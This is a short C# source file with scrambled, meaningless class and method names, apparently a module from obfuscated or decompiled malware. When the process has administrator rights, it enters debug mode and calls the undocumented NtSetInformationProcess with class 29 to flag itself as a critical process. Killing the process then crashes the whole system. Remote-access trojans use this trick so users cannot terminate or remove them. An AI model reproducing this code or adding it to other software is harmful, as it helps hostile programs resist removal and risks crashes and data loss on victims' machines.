using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace PbjBzLsVOvNrzQ;

public static class GXKXZAlMCwu
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr KLtQpdeiqvc, int WOWdrKrzGnLMW, ref int tGEUYnCbvo, int UIBusbRexwDPdH);

	public static void EzMdVaGdFHX()
	{
		if (MClTYHaGAVD())
		{
			uaBXIFXNPiAVxh();
		}
	}

	public static void uaBXIFXNPiAVxh()
	{
		int tGEUYnCbvo = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref tGEUYnCbvo, 4);
	}

	public static bool MClTYHaGAVD()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
